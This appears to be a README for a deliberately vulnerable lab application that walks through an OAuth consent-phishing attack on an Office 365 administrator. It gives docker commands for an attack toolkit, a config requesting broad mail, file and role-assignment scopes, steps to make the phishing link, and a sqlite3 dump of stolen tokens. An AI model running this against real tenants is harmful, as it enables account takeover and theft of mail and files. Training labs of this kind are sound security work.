# Vulnerable Application Information

In this vulnerable application, the attacker's objective is to escalate their privileges by deceiving the administrator into granting the attacker's defined OAuth permission. To execute this, the attacker must craft a phishing URL, which will be sent to the administrator.

For a comprehensive view of the attack, we'll simulate the victim's consent process. This involves clicking on the phishing URL and using the credentials provided upon initiating the vulnerable application. Once the administrator successfully logs in and grants the permissions, the application hosted by the attacker redirects the access token. To streamline the process, I've containerized the o365-attack-toolkit (https://github.com/mdsecactivebreach/o365-attack-toolkit).

To obtain the container, run the following command:
```shell
docker pull cumulonimbuscloud/o365-attack-toolkit
```

To launch the container, execute:
```shell
docker run --network='host' -v /tmp:/tmp -it --entrypoint /bin/bash cumulonimbuscloud/o365-attack-toolkit:latest
```

Then, navigate to /go/src/o-365-toolkit and input the following content:
```shell
cat > template.conf
    [server]
    host = 127.0.0.1
    externalport = 30662
    internalport = 8080

    [oauth]
    clientid = "<Application ID of the created application>"
    clientsecret = "<Secret of the created application>"
    scope = "<OAuth scopes you wish to request, e.g. offline_access contacts.read user.read mail.read mail.send files.readWrite.all files.read files.read.all openid profile AppRoleAssignment.ReadWrite.All>"
    redirecturi = "http://localhost:30662/gettoken" 
```

Activate the tool with ./o365-attack-toolkit. Visit http://127.0.0.1:8080/ and spot the red button at the top right. This button copies the phishing link to the clipboard. Refer to the accompanying PDF for dynamic consent and the option to append additional required permissions to the phishing link. By phishing the user and adding oneself to the administrator group, the attack can be executed.

Using the volume mapping established earlier, it's feasible to access the SQLite file on your host. This is achievable through file dumping using sqlite3. You'll find the tokens there!





## ⚠️ Warning

**Important:** Details regarding the attack, safeguards, and methods for identifying this vulnerability, weakness, or misconfiguration are available in the PDF document.

---